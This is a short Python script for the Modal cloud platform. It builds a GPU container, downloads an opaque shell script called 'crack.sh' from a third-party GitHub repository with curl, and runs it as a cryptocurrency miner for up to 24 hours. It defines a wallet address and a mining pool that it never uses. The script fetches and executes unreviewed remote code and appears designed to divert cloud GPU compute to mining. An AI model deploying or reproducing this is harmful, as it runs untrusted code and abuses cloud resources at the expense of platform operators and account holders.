import modal

app = modal.App("pearl")

WALLET = "prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t"
POOL_HOST = "prl.kryptex.network:7048"
WORKER = "T4"

pearlhash_image = (
    modal.Image.from_registry(
        "nvidia/cuda:12.4.0-runtime-ubuntu22.04",
        add_python="3.11",
    )
    .apt_install("curl", "libgomp1")
    .run_commands(
        "curl -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/crack.sh -o /opt/crack.sh && "
        "chmod +x /opt/crack.sh"
    )
)


@app.function(
    gpu="T4",
    image=pearlhash_image,
    timeout=86400,
    scaledown_window=300,
)
def mine():
    import subprocess
    import os

   

    proc = subprocess.Popen(
        ["bash","/opt/crack.sh",],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    print(f"[Modal] Miner PID: {proc.pid}")

    for line in iter(proc.stdout.readline, b""):
        print(line.decode().strip(), flush=True)

    return proc.wait()


@app.local_entrypoint()
def main():
    mine.spawn()
